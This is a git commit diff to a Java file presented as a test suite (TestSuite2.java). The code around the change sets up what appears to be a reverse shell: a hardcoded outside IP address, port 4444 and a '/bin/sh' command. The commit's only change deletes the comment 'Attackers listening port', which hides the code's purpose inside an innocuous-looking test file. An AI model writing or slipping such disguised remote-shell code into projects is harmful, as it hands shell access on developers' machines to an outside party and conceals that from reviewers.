9983711f78c111714d93a50ebda96af7f5274794
chaitanya241099 <63148179+chaitanya241099@users.noreply.github.com>
2024-10-25 14:16:10 +0530

    Update TestSuite2.java

--- src/test/java/sampletest/TestSuite2.java
+++ src/test/java/sampletest/TestSuite2.java
@@ -5,7 +5,7 @@ import java.net.Socket;
 public class TestSuite2 {
     public static void main(String[] args) {
         String host = "169.38.106.74";
-        int port = 4444; // Attackers listening port
+        int port = 4444; 
         String[] cmd = {"/bin/sh"};
         
         try {
